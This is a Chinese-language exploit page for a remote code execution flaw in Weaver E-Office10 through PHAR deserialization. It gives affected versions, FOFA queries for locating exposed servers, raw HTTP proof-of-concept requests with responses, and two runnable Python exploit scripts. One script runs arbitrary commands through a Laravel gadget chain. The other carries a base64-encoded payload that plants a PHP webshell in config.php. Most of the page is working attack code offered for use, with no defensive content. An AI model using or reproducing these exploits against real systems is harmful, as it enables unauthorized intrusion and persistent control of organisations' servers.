## 泛微E-Office10版本小于v10.0_20240222存在远程代码执行漏洞

漏洞的关键在于系统处理上传的PHAR文件时存在缺陷。攻击者能够上传伪装的PHAR文件到服务器，利用PHP处理PHAR文件时自动进行的反序列化机制来触发远程代码执行。

## 影响版本
```
v10.0_20180516 < E-Office10 < v10.0_20240222
```


## fofa
```
app="泛微-EOffice"

body="eoffice_loading_tip" && body="eoffice10"
```


## poc
```
POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 523
Accept: string("*/*")
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=jzdwsbic

--jzdwsbic
Content-Disposition: form-data; name="Filedata"; filename="register.inc"
Content-Type: image/jpeg

GIF89a<?php __HALT_COMPILER(); ?>
D.....................O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:".*.events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:".*.queueResolver";s:6:"system";}s:8:".*.event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";s:37:"echo 9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P";}}....test.txt....K..f.....~..........test.).i..f3....2pq....>....GBMB
--jzdwsbic--

返回响应包
HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:43:19 GMT
Server: Apache
Cache-Control: no-cache, private
Transfer-Encoding: chunked
Content-Type: application/json

{"status":1,"data":{"attachment_id":"263bcfcf49019d4735c62653c5cdbd6c","attachment_name":"register.inc"},"runtime":"0.314"}


POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 69
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F

回响应包
HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:43:20 GMT
Server: Apache
Cache-Control: no-cache, private
Transfer-Encoding: chunked
Content-Type: application/json

{"status":1,"data":[0,false,0,false,0,0,false,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13],"runtime":"0.382"}

POST /eoffice10/server/public/api/empower/import HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

type=tttt&file=263bcfcf49019d4735c62653c5cdbd6c

返回响应包
HTTP/1.1 200 OK
Date: Sat, 30 Mar 2024 08:43:20 GMT
Server: Apache
Cache-Control: no-cache, private
Transfer-Encoding: chunked
Content-Type: application/json

{"status":0,"errors":[{"code":"no_file","message":"\u6ce8\u518c\u6587\u4ef6\u4e0d\u5b58\u5728"}],"runtime":"0.293"}9yM86ESyFBXNDwCh6Nbsxy9wrcQrP25P
```


## exp
```python
# -*- coding:utf-8 -*-
import json
import requests
import urllib3
import hashlib
import time
from hashlib import sha1
import base64
import re

def payload(url,cmd):
    urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
    hearder = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    file = base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQokAQAAAQAAABEAAAABAAAAAADuAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQgAAAB0ZXN0LnR4dAUAAAAqH6ZhBQAAAOmPsbu0AQAAAAAAAHRlc2F05eRmN0jjnqjxPuyQ7MEQ33p3j+QCAAAAR0JNQg==")
    # print(file)
    data = file[:-28]
    # print(b's:'+bytes(str(len(cmd)),encoding="utf-8")+b':"'+bytes(cmd, encoding='utf-8')+b'"')
    data = data.replace(b's:6:"whoami"', b's:'+bytes(str(len(cmd)),encoding="utf-8")+b':"'+bytes(cmd, encoding='utf-8')+b'"')
    final = file[-8:]
    newfile = data + sha1(data).digest() + final
    upload_file = {"Filedata": ("register.inc", newfile, "image/jpeg")}
    urllib3.disable_warnings()
    response = requests.post(url=urls, files=upload_file, headers=hearder,proxies={"http":"http://127.0.0.1:8081","https":"https://127.0.0.1:8081"})
    response_text = response.text
    attachment_id = json.loads(response_text)['data']['attachment_id']

    urls = url + '/eoffice10/server/public/api/wps/v1/3rd/file/history'
    heards = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
        'x-weboffice-file-id': attachment_id
    }
    urllib3.disable_warnings()
    response = requests.post(url=urls, headers=heards, verify=False)  # ,proxies=proxy)
    print(response.text)

    response_json = response.json()
    create_time = re.findall(r"create_time\":(.*?),\"modify_tim",response.text)


    filename = str(create_time) + 'register.inc'
    md5name = hashlib.md5(filename.encode())
    md5name = md5name.hexdigest()
    Time = time.strftime('%Y/%m/%d', time.localtime(time.time()))

    urls = url + '/eoffice10/server/public/api/dingtalk/dingtalk-move?imgs=phar://../../../../attachment/' + Time + '/' + attachment_id + '/' + md5name + '.inc'
    hearder = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    urllib3.disable_warnings()
    print(urls)
    response = requests.post(url=urls, verify=False, headers=hearder)  # ,proxies=proxy)
    response_text = response.text
    print(response_text)
    #result = response_text.split('}')[-1]
    #print(result)


if __name__ == '__main__':
    url = ""
    #url = "
    cmd = "dir"
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if url.endswith("/"):
        url = url[:-1]
    payload(url,cmd)
```

## exp2
```python
# -*- coding:utf-8 -*-
import json
import requests
import urllib3
import base64


def payload(url):
    urls = url + '/eoffice10/server/public/api/attachment/atuh-file'
    hearder = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36'}
    file = base64.b64decode(       "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpSAQAAAQAAABEAAAABAAAAAAAcAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6NTE6ImVjaG8gXjw/cGhwIGV2YWwoJF9QT1NUWzFdKTs/Xj4gPiAuLi93d3cvY29uZmlnLnBocCI7fX0IAAAAdGVzdC50eHQEAAAAXcwLZgQAAAAMfn/YtgEAAAAAAAB0ZXN0r2B11kfQUeYqVgXThGL/oWPzcSMCAAAAR0JNQg==")
    upload_file = {"Filedata": ("register.inc", file, "image/jpeg")}
    urllib3.disable_warnings()
    response = requests.post(url=urls, files=upload_file, headers=hearder)
    response_text = response.text
    attachment_id = json.loads(response_text)['data']['attachment_id']

    urls = url + '/eoffice10/server/public/api/attachment/path/migrate'
    headerss = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    data1 = 'source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F'
    urllib3.disable_warnings()
    response = requests.post(url=urls, headers=headerss, data=data1,verify=False )

    urls = url + '/eoffice10/server/public/api/empower/import'
    headersss = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    urllib3.disable_warnings()
    data2 = 'type=tttt&file=' + attachment_id
    response = requests.post(url=urls, verify=False, headers=headersss, data=data2 )
    response_text = response.text
    if "no_file" in response_text:
        print("写入成功")
    else:
        print("写入失败")


if __name__ == '__main__':
    url = input("url: ")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    if url.endswith("/"):
        url = url[:-1]
    payload(url)
```

## 漏洞来源
- https://mp.weixin.qq.com/s/45_7Qz8AH1w471rbtFCyjw
- https://mp.weixin.qq.com/s/nXg-2YF-iOMZW4mfDBYJYQ
- https://mp.weixin.qq.com/s/eMP7DsdvomHypAUIqcXZZQ
